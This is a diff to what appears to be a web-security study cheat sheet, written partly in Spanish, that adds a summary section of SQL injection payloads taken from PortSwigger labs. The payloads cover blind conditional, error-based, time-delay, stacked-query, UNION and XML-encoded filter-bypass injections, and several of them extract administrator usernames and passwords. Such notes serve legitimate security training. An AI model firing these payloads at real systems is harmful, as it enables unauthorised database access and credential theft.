@@ -2497,7 +2497,8 @@ Partimos de:
 [SQLMAP](#sqlmap)  
 [Non-Oracle Manual SQLi](#non-oracle-manual-sqli)  
 [Visual error-based SQLi](#visual-error-based-sqli)  
-[HackTheBox CPTS SQLi Fundamentals](https://github.com/botesjuan/cpts-quick-references/blob/main/module/SQL%20Injection%20Fundamentals.md)
+[HackTheBox CPTS SQLi Fundamentals](https://github.com/botesjuan/cpts-quick-references/blob/main/module/SQL%20Injection%20Fundamentals.md)  
+[Conclusiones útiles](#conclusiones-útiles)  
   
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
@@ -2785,6 +2786,51 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 ![SQL Injection CAST function](images/SQL-Injection-CAST-function.png)  
 
 [PortSwigger Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)  
+
+### Conclusiones útiles  
+
+- cookie. Ej: `TrackingId` o parámetro `sort-by` - resultados de la query NO devueltos en la respuesta, pero podemos fijarnos en esos 4 indicadores (CE, CR, VE-B, TD) para ver si la query devuelve información.
+
+```
+* Conditional response
+(PoC)				TrackingId=xyz' AND '1'='1 vs TrackingId=xyz' AND '1'='2 ==> different responses
+(Verify admin user)		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
+
+* Conditional errors
+(PoC)				TrackingId=xyz' ==> error message vs TrackingId=xyz'' ==> no error message
+(users table exists?)		TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' ==> no error, table exists
+(Verify admin user)		TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+(guess password length)		TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+* Visible error-based
+(PoC)				TrackingId=ogAZZfxtOKUELbuJ' ==> verbose error message with full SQL query
+(Cast to int type)		TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- ==> error: AND condition must  be boolean expression
+(Valid query)			TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+(Admin password)		TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+* Time delays
+(PoC1)				TrackingId=x'||pg_sleep(10)--
+(PoC2   - Stacked query)	sort-by=DATE;SELECT+pg_sleep(10)--
+(PoC2.1 - Stacked query)	TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--  ==> if 10 seconds delay, SQLi
+(Verify admin user)		TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+(guess admin pw length)		TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--		
+```
+
+- parámetro de búsqueda. Ej: `category` - resultados de la query devueltos en la respuesta, por eso se puede usar UNION attack.
+
+```
+(Non-Oracle) 			'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+(Oracle) 			'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+(Multiple values - 2 columns)	'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
+- XML encoded (Hackvertor > Encode > dec_entities/hex_entities)
+
+```
+<storeId>
+  <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
+</storeId>
+``` 
 
 -----
 
